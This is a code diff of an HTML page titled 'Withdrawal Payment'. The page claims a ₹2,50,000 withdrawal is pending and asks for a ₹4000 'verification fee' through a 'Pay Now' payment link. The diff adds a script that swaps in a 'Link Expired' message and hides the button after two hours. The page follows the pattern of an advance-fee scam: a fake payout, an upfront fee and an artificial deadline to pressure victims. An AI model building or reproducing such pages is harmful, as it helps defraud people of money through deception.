@@ -1,54 +1,64 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1">
-  <title>Withdrawal Payment</title>
-  <style>
-    body {
-      font-family: Arial, sans-serif;
-      background-color: #f3f3f3;
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      height: 100vh;
-    }
-    .container {
-      background-color: #fff;
-      padding: 30px;
-      border-radius: 10px;
-      text-align: center;
-      box-shadow: 0 0 15px rgba(0,0,0,0.1);
-    }
-    h1 {
-      color: #333;
-    }
-    p {
-      font-size: 18px;
-      color: #555;
-    }
-    .btn {
-      margin-top: 20px;
-      padding: 12px 25px;
-      background-color: #28a745;
-      color: white;
-      border: none;
-      border-radius: 8px;
-      font-size: 16px;
-      cursor: pointer;
-      text-decoration: none;
-      display: inline-block;
-    }
-    .btn:hover {
-      background-color: #218838;
-    }
-  </style>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>Withdrawal Payment</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background-color: #f3f3f3;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+    }
+    .container {
+      background-color: #fff;
+      padding: 30px;
+      border-radius: 10px;
+      text-align: center;
+      box-shadow: 0 0 15px rgba(0,0,0,0.1);
+    }
+    h1 {
+      color: #333;
+    }
+    p {
+      font-size: 18px;
+      color: #555;
+    }
+    .btn {
+      margin-top: 20px;
+      padding: 12px 25px;
+      background-color: #28a745;
+      color: white;
+      border: none;
+      border-radius: 8px;
+      font-size: 16px;
+      cursor: pointer;
+      text-decoration: none;
+      display: inline-block;
+    }
+    .btn:hover {
+      background-color: #218838;
+    }
+  </style>
 </head>
 <body>
-  <div class="container">
-    <h1>Withdrawal Pending</h1>
-    <p>To process your withdrawal request of ₹2,50,000, please complete the verification fee of ₹4000.</p>
-    <a class="btn" href="https://payments.cashfree.com/links?code=R8f4ueunbo20" target="_blank">Pay Now</a>
-  </div>
+  <div class="container">
+    <h1 id="status">Withdrawal Pending</h1>
+    <p id="message">To process your withdrawal request of ₹2,50,000, please complete the verification fee of ₹4000.</p>
+    <a class="btn" id="payBtn" href="https://payments.cashfree.com/links?code=R8f4ueunbo20" target="_blank">Pay Now</a>
+  </div>
+
+  <script>
+    // 2 ghante = 2 * 60 * 60 * 1000 milliseconds
+    setTimeout(function() {
+      document.getElementById('status').innerText = "Link Expired";
+      document.getElementById('message').innerText = "The payment link has expired. Please contact support.";
+      var btn = document.getElementById('payBtn');
+      btn.style.display = 'none'; // Button chhupa diya
+    }, 2 * 60 * 60 * 1000); // 2 hours
+  </script>
 </body>
 </html>
